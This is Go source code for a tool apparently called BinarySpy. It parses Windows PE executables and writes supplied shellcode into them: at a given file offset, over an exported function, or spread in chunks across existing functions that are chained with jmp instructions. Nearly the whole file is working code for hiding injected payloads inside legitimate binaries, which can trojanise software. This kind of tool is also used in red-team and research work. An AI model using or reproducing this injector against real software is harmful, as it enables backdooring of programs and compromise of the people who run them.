package main

import (
	"bytes"
	"debug/pe"
	"encoding/binary"
	"flag"
	"fmt"
	"io"
	"io/ioutil"
	"os"
	"strconv"
)

type PEHeader struct {
	Signature      uint32
	FileHeader     pe.FileHeader
	OptionalHeader interface{}
}

type SectionHeader struct {
	Name                 string
	VirtualSize          uint32
	VirtualAddress       uint32
	SizeOfRawData        uint32
	PointerToRawData     uint32
	PointerToRelocations uint32
	PointerToLinenumbers uint32
	NumberOfRelocations  uint16
	NumberOfLinenumbers  uint16
	Characteristics      uint32
}

type ExportDirectory struct {
	Characteristics       uint32
	TimeDateStamp         uint32
	MajorVersion          uint16
	MinorVersion          uint16
	Name                  uint32
	Base                  uint32
	NumberOfFunctions     uint32
	NumberOfNames         uint32
	AddressOfFunctions    uint32
	AddressOfNames        uint32
	AddressOfNameOrdinals uint32
}

// Function represents a function in the PE file
type Function struct {
	CallAddr uint32
	StartFA  uint32
	EndFA    uint32
	Size     uint32
}

func ParsePEFile(filePath string) (PEHeader, []SectionHeader, error) {
	// 打开PE文件
	file, err := os.Open(filePath)
	if err != nil {
		return PEHeader{}, nil, fmt.Errorf("failed to open file: %v", err)
	}
	defer file.Close()

	// 读取DOS头
	dosHeader := make([]byte, 64)
	if _, err := file.Read(dosHeader); err != nil {
		return PEHeader{}, nil, fmt.Errorf("failed to read DOS header: %v", err)
	}

	// 获取PE头的偏移量
	peOffset := binary.LittleEndian.Uint32(dosHeader[60:64])
	if _, err := file.Seek(int64(peOffset), io.SeekStart); err != nil {
		return PEHeader{}, nil, fmt.Errorf("failed to seek to PE header: %v", err)
	}

	// 解析PE文件
	peFile, err := pe.NewFile(file)
	if err != nil {
		return PEHeader{}, nil, fmt.Errorf("failed to parse PE file: %v", err)
	}

	// 获取节区数量
	numSections := peFile.FileHeader.NumberOfSections
	fmt.Printf("Number of Sections: %d\n", numSections)

	// 计算节区表的文件偏移量
	optionalHeaderSize := peFile.FileHeader.SizeOfOptionalHeader
	sectionHeadersOffset := int64(peOffset) + 4 + int64(binary.Size(peFile.FileHeader)) + int64(optionalHeaderSize)
	fmt.Printf("Section Headers Offset: %d\n", sectionHeadersOffset)

	// 构造返回值
	var optionalHeader interface{}
	switch oh := peFile.OptionalHeader.(type) {
	case *pe.OptionalHeader64:
		optionalHeader = *oh
	case *pe.OptionalHeader32:
		optionalHeader = *oh
	default:
		return PEHeader{}, nil, fmt.Errorf("unexpected optional header type")
	}

	peHeader := PEHeader{
		Signature:      peOffset,
		FileHeader:     peFile.FileHeader,
		OptionalHeader: optionalHeader,
	}

	sectionHeaders := make([]SectionHeader, numSections)
	for i, section := range peFile.Sections {
		sectionHeaders[i] = SectionHeader{
			Name:                 section.Name,
			VirtualSize:          section.VirtualSize,
			VirtualAddress:       section.VirtualAddress,
			SizeOfRawData:        section.Size,
			PointerToRawData:     section.Offset,
			PointerToRelocations: section.PointerToRelocations,
			PointerToLinenumbers: section.PointerToLineNumbers,
			NumberOfRelocations:  section.NumberOfRelocations,
			NumberOfLinenumbers:  section.NumberOfLineNumbers,
			Characteristics:      section.Characteristics,
		}
	}

	return peHeader, sectionHeaders, nil
}

/*// 找所有匹配的函数片段
func FindFunctions(data []byte, peHeader PEHeader, sectionHeaders []SectionHeader) ([]Function, error) {
	var functions []Function

	// 获取入口点
	var entryPoint uint32
	switch oh := peHeader.OptionalHeader.(type) {
	case pe.OptionalHeader64:
		entryPoint = oh.AddressOfEntryPoint
	case pe.OptionalHeader32:
		entryPoint = oh.AddressOfEntryPoint
	default:
		return nil, fmt.Errorf("unexpected optional header type")
	}

	for _, section := range sectionHeaders {
		// 检查是否为 .text 段
		if string(section.Name[:5]) != ".text" {
			continue
		}

		if section.PointerToRawData+section.SizeOfRawData > uint32(len(data)) {
			return nil, fmt.Errorf("section size exceeds file size")
		}

		// 计算入口点在文件中的偏移量
		entryPointOffset := entryPoint - section.VirtualAddress + section.PointerToRawData
		fmt.Printf("entrypoint FA: 0x%x\n", entryPointOffset)

		// 确保入口点在 .text 段内
		if entryPointOffset < section.PointerToRawData || entryPointOffset >= section.PointerToRawData+section.SizeOfRawData {
			return nil, fmt.Errorf("entry point is not within the .text section")
		}

		// 从入口点开始遍历
		sectionData := data[entryPointOffset : section.PointerToRawData+section.SizeOfRawData]
		reader := bytes.NewReader(sectionData)

		var startFA, endFA uint32
		callcount := 0
		fmt.Printf("entryPoint: 0x%x, entryPointOffset: 0x%x\n", entryPoint, entryPointOffset)
		fmt.Printf("section.PointerToRawData: 0x%x, section.SizeOfRawData: 0x%x\n", section.PointerToRawData, section.SizeOfRawData)

		for {
			var opcode byte
			if err := binary.Read(reader, binary.LittleEndian, &opcode); err != nil {
				if err == io.EOF {
					break
				}
				return nil, err
			}
			offset, err := reader.Seek(0, io.SeekCurrent)
			if err != nil {
				return nil, err
			}
			offset -= 1
			opcodeOffset := uint32(offset)
			if opcode == 0xE8 {
				callcount++
				if callcount <= 300 {
					continue
				}
				var relAddr uint32
				if err := binary.Read(reader, binary.LittleEndian, &relAddr); err != nil {
					return nil, err
				}
				callAddr := uint32(offset + int64(5) + int64(relAddr))
				fmt.Printf("callAddr: 0x%x, relAddr: %xh\n", callAddr, relAddr)
				startFA, _ = VAtoFileOffset(peHeader, sectionHeaders, uint64(callAddr))
				fmt.Printf("startFA: 0x%x\n", startFA)

				callOffset := section.PointerToRawData + uint32(offset) + 5 + uint32(relAddr)
				if callOffset < section.PointerToRawData || callOffset >= section.PointerToRawData+section.SizeOfRawData {
					continue
				}
				currentPos, _ := reader.Seek(0, io.SeekCurrent)
				reader.Seek(int64(callOffset-section.PointerToRawData), io.SeekStart)

				for {
					var nestedOpcode byte
					if err := binary.Read(reader, binary.LittleEndian, &nestedOpcode); err != nil {
						if err == io.EOF {
							break
						}
						return nil, err
					}
					nestedOffset, err := reader.Seek(0, io.SeekCurrent)
					if err != nil {
						return nil, err
					}
					nestedOffset -= 1
					if nestedOpcode == 0xC3 {
						endFA = section.PointerToRawData + uint32(nestedOffset)
						fmt.Printf("endFA: 0x%x\n", endFA)
						if startFA != 0 && endFA != 0 {
							functions = append(functions, Function{
								CallAddr: entryPointOffset + opcodeOffset,
								StartFA:  entryPointOffset + startFA,
								EndFA:    entryPointOffset + endFA,
								Size:     endFA - startFA,
							})
							startFA, endFA = 0, 0
						}
						break
					}
				}
				reader.Seek(currentPos, io.SeekStart)
			}
		}
	}

	return functions, nil
}
*/

func FindFunctions(data []byte, peHeader PEHeader, sectionHeaders []SectionHeader) ([]Function, error) {
	var functions []Function

	// 获取入口点
	var entryPoint uint32
	switch oh := peHeader.OptionalHeader.(type) {
	case pe.OptionalHeader64:
		entryPoint = oh.AddressOfEntryPoint
	case pe.OptionalHeader32:
		entryPoint = oh.AddressOfEntryPoint
	default:
		return nil, fmt.Errorf("unexpected optional header type")
	}

	for _, section := range sectionHeaders {
		// 检查是否为 .text 段
		if string(section.Name[:5]) != ".text" {
			continue
		}

		if section.PointerToRawData+section.SizeOfRawData > uint32(len(data)) {
			return nil, fmt.Errorf("section size exceeds file size")
		}

		// 计算入口点在文件中的偏移量
		entryPointOffset := entryPoint - section.VirtualAddress + section.PointerToRawData
		fmt.Printf("entrypoint FA: 0x%x\n", entryPointOffset)

		// 确保入口点在 .text 段内
		if entryPointOffset < section.PointerToRawData || entryPointOffset >= section.PointerToRawData+section.SizeOfRawData {
			return nil, fmt.Errorf("entry point is not within the .text section")
		}

		// 从入口点开始遍历
		sectionData := data[entryPointOffset : section.PointerToRawData+section.SizeOfRawData]
		reader := bytes.NewReader(sectionData)

		var startFA, endFA uint32
		callcount := 0
		fmt.Printf("entryPoint: 0x%x, entryPointOffset: 0x%x\n", entryPoint, entryPointOffset)
		fmt.Printf("section.PointerToRawData: 0x%x, section.SizeOfRawData: 0x%x\n", section.PointerToRawData, section.SizeOfRawData)

		for {
			var opcode byte
			if err := binary.Read(reader, binary.LittleEndian, &opcode); err != nil {
				if err == io.EOF {
					break
				}
				return nil, err
			}
			offset, err := reader.Seek(0, io.SeekCurrent)
			if err != nil {
				return nil, err
			}
			offset -= 1
			opcodeOffset := uint32(offset)
			if opcode == 0xE8 {
				callcount++
				if callcount <= 300 {
					continue
				}
				var relAddr int32
				if err := binary.Read(reader, binary.LittleEndian, &relAddr); err != nil {
					return nil, err
				}
				callAddr := uint32(int32(offset) + 5 + relAddr)
				fmt.Printf("callAddr: 0x%x, relAddr: %xh\n", callAddr, relAddr)
				startFA, _ = VAtoFileOffset(peHeader, sectionHeaders, uint64(callAddr))
				fmt.Printf("startFA: 0x%x\n", startFA)

				callOffset := section.PointerToRawData + uint32(offset) + 5 + uint32(relAddr)
				if callOffset < section.PointerToRawData || callOffset >= section.PointerToRawData+section.SizeOfRawData {
					continue
				}
				currentPos, _ := reader.Seek(0, io.SeekCurrent)
				reader.Seek(int64(callOffset-section.PointerToRawData), io.SeekStart)

				for {
					var nestedOpcode byte
					if err := binary.Read(reader, binary.LittleEndian, &nestedOpcode); err != nil {
						if err == io.EOF {
							break
						}
						return nil, err
					}
					nestedOffset, err := reader.Seek(0, io.SeekCurrent)
					if err != nil {
						return nil, err
					}
					nestedOffset -= 1
					if nestedOpcode == 0xC3 {
						endFA = section.PointerToRawData + uint32(nestedOffset)
						fmt.Printf("endFA: 0x%x\n", endFA)
						if startFA != 0 && endFA != 0 {
							functions = append(functions, Function{
								CallAddr: entryPointOffset + opcodeOffset,
								StartFA:  entryPointOffset + startFA,
								EndFA:    entryPointOffset + endFA,
								Size:     endFA - startFA,
							})
							startFA, endFA = 0, 0
						}
						break
					}
				}
				reader.Seek(currentPos, io.SeekStart)
			}
		}
	}

	/*	// 略过 CRT 函数，找到 main 函数
		mainFunc, err := FindMainFunction(functions)
		if err != nil {
			return nil, err
		}*/

	return functions, nil
}

/*func FindMainFunction(functions []Function) (Function, error) {
	for _, function := range functions {
		// 假设 main 函数的名称为 "main" 或 "_main"
		if function.Name == "main" || function.Name == "_main" {
			return function, nil
		}
	}
	return Function{}, fmt.Errorf("main function not found")
}*/

// FindSuitableFunction 找到合适的函数存放shellcode。
// 这里就是找到空间比shellcode大的函数，可以做一个map，随机用一个空间
func FindSuitableFunction(functions []Function, binSize uint32) *Function {
	for _, function := range functions {
		if function.Size >= binSize {
			fmt.Println("找到足够充足的空间！")
			fmt.Printf("patch func calladdr: 0x%x, startFA: 0x%x , endFA: 0x%x\n", function.CallAddr, function.StartFA, function.EndFA)
			return &function

		}
	}
	return nil
}

// VAtoFileOffset VA2FA
func VAtoFileOffset(peHeader PEHeader, sectionHeaders []SectionHeader, va uint64) (uint32, error) {
	for _, section := range sectionHeaders {
		if va >= uint64(section.VirtualAddress) && va < uint64(section.VirtualAddress)+uint64(section.VirtualSize) {
			return uint32(va - uint64(section.VirtualAddress) + uint64(section.PointerToRawData)), nil
		}
	}
	return 0, fmt.Errorf("VA not found in any section")
}

// PatchFileOffset patch FA
func PatchFileOffset(filePath string, offset uint32, patchData []byte) error {
	// Read the PE file
	data, err := ioutil.ReadFile(filePath)
	if err != nil {
		return fmt.Errorf("failed to read file: %v", err)
	}

	// Patch the symbol with the new content
	copy(data[offset:], patchData)

	// Write the modified data back to the file
	if err := ioutil.WriteFile(filePath, data, 0644); err != nil {
		return fmt.Errorf("failed to write file: %v", err)
	}

	return nil
}

// 分割shellcode块
func SplitBinData(binData []byte, functions []Function) ([][]byte, error) {
	var chunks [][]byte
	binSize := len(binData)
	offset := 0

	for _, function := range functions {
		if offset >= binSize {
			break
		}
		chunkSize := int(function.Size)
		if offset+chunkSize > binSize {
			chunkSize = binSize - offset
		}
		chunks = append(chunks, binData[offset:offset+chunkSize])
		offset += chunkSize
	}

	if offset < binSize {
		return nil, fmt.Errorf("not enough function space to store the entire bin data")
	}

	return chunks, nil
}

// PatchExportSymbol patch PE 导出符号
func PatchExportSymbol(filePath, symbolName string, patchData []byte, peHeader PEHeader, sectionHeaders []SectionHeader) error {
	// Read the PE file
	data, err := ioutil.ReadFile(filePath)
	if err != nil {
		return fmt.Errorf("failed to read file: %v", err)
	}

	// 获取导出目录RVA
	var exportDirectoryRVA uint32
	switch oh := peHeader.OptionalHeader.(type) {
	case pe.OptionalHeader64:
		exportDirectoryRVA = oh.DataDirectory[pe.IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress
	case pe.OptionalHeader32:
		exportDirectoryRVA = oh.DataDirectory[pe.IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress
	default:
		return fmt.Errorf("unexpected optional header type")
	}

	// 计算导出目录的文件偏移量
	var exportDirectoryOffset uint32
	for _, section := range sectionHeaders {
		if exportDirectoryRVA >= section.VirtualAddress && exportDirectoryRVA < section.VirtualAddress+section.VirtualSize {
			exportDirectoryOffset = exportDirectoryRVA - section.VirtualAddress + section.PointerToRawData
			break
		}
	}

	// 读取导出目录
	var exportDirectory ExportDirectory
	reader := bytes.NewReader(data[exportDirectoryOffset:])
	if err := binary.Read(reader, binary.LittleEndian, &exportDirectory); err != nil {
		return fmt.Errorf("failed to parse export directory: %v", err)
	}

	// 查找符号名称
	nameRVA := exportDirectory.AddressOfNames
	for i := uint32(0); i < exportDirectory.NumberOfNames; i++ {
		nameOffset := nameRVA - sectionHeaders[0].VirtualAddress + sectionHeaders[0].PointerToRawData + 4*i
		nameRVA := binary.LittleEndian.Uint32(data[nameOffset:])
		nameOffset = nameRVA - sectionHeaders[0].VirtualAddress + sectionHeaders[0].PointerToRawData
		name := string(data[nameOffset:bytes.IndexByte(data[nameOffset:], 0)])
		if name == symbolName {
			ordinalOffset := exportDirectory.AddressOfNameOrdinals - sectionHeaders[0].VirtualAddress + sectionHeaders[0].PointerToRawData + 2*i
			ordinal := binary.LittleEndian.Uint16(data[ordinalOffset:])
			functionRVA := binary.LittleEndian.Uint32(data[exportDirectory.AddressOfFunctions-sectionHeaders[0].VirtualAddress+sectionHeaders[0].PointerToRawData+4*uint32(ordinal):])
			functionOffset := functionRVA - sectionHeaders[0].VirtualAddress + sectionHeaders[0].PointerToRawData
			copy(data[functionOffset:], patchData)
			break
		}
	}

	if err := ioutil.WriteFile(filePath, data, 0644); err != nil {
		return fmt.Errorf("failed to write file: %v", err)
	}

	return nil
}

// PatchFunctions 给分配的各个shellcode chunk末尾添加jmp xxxxxxxx语句，跳转到下一个chunk
func PatchFunctions(filePath string, functions []Function, chunks [][]byte) error {
	for i, chunk := range chunks {
		if err := PatchFileOffset(filePath, functions[i].StartFA, chunk); err != nil {
			return fmt.Errorf("failed to patch function: %v", err)
		}
		if i < len(chunks)-1 {
			jmpOffset := functions[i+1].StartFA - (functions[i].StartFA + uint32(len(chunk)))
			jmpInstruction := []byte{0xE9, byte(jmpOffset), byte(jmpOffset >> 8), byte(jmpOffset >> 16), byte(jmpOffset >> 24)}
			if err := PatchFileOffset(filePath, functions[i].StartFA+uint32(len(chunk)), jmpInstruction); err != nil {
				return fmt.Errorf("failed to add jmp instruction: %v", err)
			}
		}
	}
	return nil
}

func main() {
	fmt.Println("  ____  _                        ____              \n | __ )(_)_ __   __ _ _ __ _   _/ ___| _ __  _   _ \n |  _ \\| | '_ \\ / _` | '__| | | \\___ \\| '_ \\| | | |\n | |_) | | | | | (_| | |  | |_| |___) | |_) | |_| |\n |____/|_|_| |_|\\__,_|_|   \\__, |____/| .__/ \\__, |\n                           |___/      |_|    |___/ \n")
	fmt.Printf("by https://github.com/berryalen02/BinarySpy\n")

	fa := flag.String("fa", "", "文件偏移FA")
	symbol := flag.String("symbol", "", "PE的导出函数")
	filePath := flag.String("file", "", "目标PE文件")
	patchSource := flag.String("patch", "", "shellcode")
	help := flag.Bool("h", false, "help")
	autoSearch := flag.Bool("auto", false, "自动寻找适合的文件偏移存储shellcode")

	flag.Parse()

	if *help {
		fmt.Println("Usage: patcher -file <file_path> -patch <new_content|bin_file> [-fa <fa>] [-symbol <symbol>] [-bin] [-author <author>]")
		fmt.Println("\nOptions:")
		flag.PrintDefaults()
		return
	}

	if *filePath == "" || *patchSource == "" {
		fmt.Println("Usage: patcher -file <file_path> -patch <new_content|bin_file> [-fa <fa>] [-symbol <symbol>] [-bin] [-author <author>]")
		return
	}

	fmt.Println("Starting patch process...")

	// 解析pe文件
	peHeader, sectionHeaders, err := ParsePEFile(*filePath)
	if err != nil {
		fmt.Printf("Failed to parse PE file: %v\n", err)
		return
	}

	// 读取欲patch文件
	data, err := ioutil.ReadFile(*filePath)
	if err != nil {
		fmt.Printf("Failed to read file: %v\n", err)
		return
	}

	// 读取shellcode
	patchData, err := ioutil.ReadFile(*patchSource)
	if err != nil {
		fmt.Printf("Failed to read bin file: %v\n", err)
		return
	}

	// 自动模式
	if *autoSearch {
		fmt.Println("智能注入中.....")
		functions, err := FindFunctions(data, peHeader, sectionHeaders)
		if err != nil {
			fmt.Printf("Failed to find functions: %v\n", err)
			return
		}

		suitableFunction := FindSuitableFunction(functions, uint32(len(patchData)))
		if suitableFunction == nil {
			fmt.Println("没有足够大的函数空间能patch")
		} else {
			if err := PatchFileOffset(*filePath, suitableFunction.StartFA, patchData); err != nil {
				fmt.Println("Faild to patch function : %v", suitableFunction)
				return
			}
		}

		fmt.Println("寻找碎片空间.....")
		// shellcode分块
		chunks, _ := SplitBinData(patchData, functions)
		if len(chunks) == 0 {
			fmt.Println("没有合适的碎片空间")
			return
		}

		// shellcode分块存储 + jmp patch
		if err := PatchFunctions(*filePath, functions, chunks); err != nil {
			fmt.Printf("Failed to patch functions: %v\n", err)
		}

		fmt.Printf("智能注入成功！")
		return
	}

	if *fa != "" {
		faUint, err := strconv.ParseUint(*fa, 0, 32)
		if err != nil {
			fmt.Printf("Invalid FA: %v\n", err)
			return
		}
		// 直接fa进行shellcode覆盖
		if err := PatchFileOffset(*filePath, uint32(faUint), patchData); err != nil {
			fmt.Printf("Failed to patch symbol: %v\n", err)
		} else if *symbol != "" {
			if err := PatchExportSymbol(*filePath, *symbol, patchData, peHeader, sectionHeaders); err != nil {
				fmt.Printf("Failed to patch export symbol: %v\n", err)
			}
		} else {
			fmt.Println("Usage: patcher -file <file_path> -patch <new_content|bin_file> [-fa <fa>] [-symbol <symbol>] [-bin] [-author <author>]")
			return
		}

		fmt.Printf("Shellcode Inject Completed!")
	}
}
